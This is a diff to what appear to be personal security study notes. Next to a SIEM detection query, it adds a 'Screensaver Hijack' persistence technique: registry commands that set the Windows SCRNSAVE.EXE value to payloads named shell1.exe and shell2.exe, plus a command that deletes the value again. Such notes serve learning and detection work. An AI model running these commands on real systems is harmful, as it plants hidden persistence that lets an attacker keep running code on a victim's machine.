@@ -220,3 +220,20 @@ SIEM search query :
 | where count > 5
 
 ```
+
+
+### Screensaver Hijack
+if the windows idle for 1 minute you will see bubble,line or blank screen as you configure in screensaver. if leverages the screen scrnsave.exe add the our payload.
+```bash
+#Add new registry key
+reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\Administrator\Downloads\shell2.exe
+
+#Replace existing registry key.
+New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'C:\Users\Administrator\Downloads\shell1.exe'
+
+#delete the registry key
+reg delete "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /f
+```
+
+### Modify shortcuts 
+![[Pasted image 20251006001827.png]]
